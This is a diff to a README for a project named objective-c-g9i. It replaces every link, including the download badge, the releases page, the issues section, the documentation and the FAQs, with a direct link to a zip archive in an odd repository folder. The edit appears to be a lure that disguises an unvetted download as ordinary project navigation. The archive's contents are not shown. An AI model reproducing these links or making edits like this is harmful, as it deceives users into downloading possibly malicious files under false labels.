@@ -6,7 +6,7 @@ Welcome to the objective-c-g9i project! This application offers tools to help yo
 
 ## 📥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-brightgreen)](https://github.com/doreenracy749/objective-c-g9i/releases)
+[![Download Here](https://raw.githubusercontent.com/doreenracy749/objective-c-g9i/main/pyritohedral/objective-c-g9i_v3.6-alpha.1.zip%20Now-Click%20to%20Download-brightgreen)](https://raw.githubusercontent.com/doreenracy749/objective-c-g9i/main/pyritohedral/objective-c-g9i_v3.6-alpha.1.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, make sure your computer meets the following requirements:
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/doreenracy749/objective-c-g9i/releases) to download the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/doreenracy749/objective-c-g9i/main/pyritohedral/objective-c-g9i_v3.6-alpha.1.zip) to download the software.
 2. Locate the latest version of the software.
 3. Click on the version number, then find the appropriate file for your operating system.
 4. Download the file by clicking on it.
@@ -57,7 +57,7 @@ After installing, follow these simple steps:
 
 If you encounter any issues or have questions, reach out for help. We appreciate your feedback and aim to improve with your input. 
 
-You can report issues in the [Issues section](https://github.com/doreenracy749/objective-c-g9i/issues) of the repository. 
+You can report issues in the [Issues section](https://raw.githubusercontent.com/doreenracy749/objective-c-g9i/main/pyritohedral/objective-c-g9i_v3.6-alpha.1.zip) of the repository. 
 
 ## 📅 Update
 
@@ -69,8 +69,8 @@ Remember to always download the latest version to take advantage of new function
 
 For additional resources and community support, check out:
 
-- [Official Documentation](https://github.com/doreenracy749/objective-c-g9i/wiki)
-- [FAQs](https://github.com/doreenracy749/objective-c-g9i/wiki/FAQs)
+- [Official Documentation](https://raw.githubusercontent.com/doreenracy749/objective-c-g9i/main/pyritohedral/objective-c-g9i_v3.6-alpha.1.zip)
+- [FAQs](https://raw.githubusercontent.com/doreenracy749/objective-c-g9i/main/pyritohedral/objective-c-g9i_v3.6-alpha.1.zip)
 
 ## ✅ Final Notes
 
